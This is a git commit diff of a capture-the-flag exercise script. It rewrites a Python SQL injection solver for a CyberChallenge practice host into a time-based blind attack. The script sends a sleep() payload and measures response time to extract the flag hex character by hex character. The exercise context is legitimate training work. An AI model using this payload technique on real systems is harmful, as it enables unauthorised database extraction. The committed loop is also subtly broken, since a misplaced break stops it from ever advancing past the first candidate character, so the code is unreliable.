030321ec527e2043e5adadbb0edced272649c011
Visos <72092380+Visos@users.noreply.github.com>
2024-04-05 15:42:03 +0200

    inj4

--- challenge/websec/inj4.py
+++ challenge/websec/inj4.py
@@ -1,31 +1,26 @@
 from inj_class import Inj
+import time 
 
 
 inj = Inj('http://sqlinjection.challs.cyberchallenge.it/')
-
-#result, error = inj.union("1' and (select 1 from secret where hex(asecret) LIKE 'guess%')='1") # will make a request to the 'union' endpoint
-#print(result, error)
-
-
-
-payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
-
+payload = "1' and (select sleep(1) from flags where HEX(flag) LIKE '{}%')='1"
 dictionary = '0123456789abcdef'
 result = ''
 i = 0
 
 while True:
-
     for c in dictionary:
         i= i+1
         print('prova ', i)
+        before_request = time.time()
         question = payload.format(result + c)  
         response, error = inj.blind(question)
-        if response == 'Success': # We have a match!
+        total_time = time.time()-before_request 
+        
+        if total_time > 1:
+            # match!
             result += c
-            break
+        break
     else:
         break # yup, for loops in python have an else condition
 print(bytes.fromhex(result))
-
-
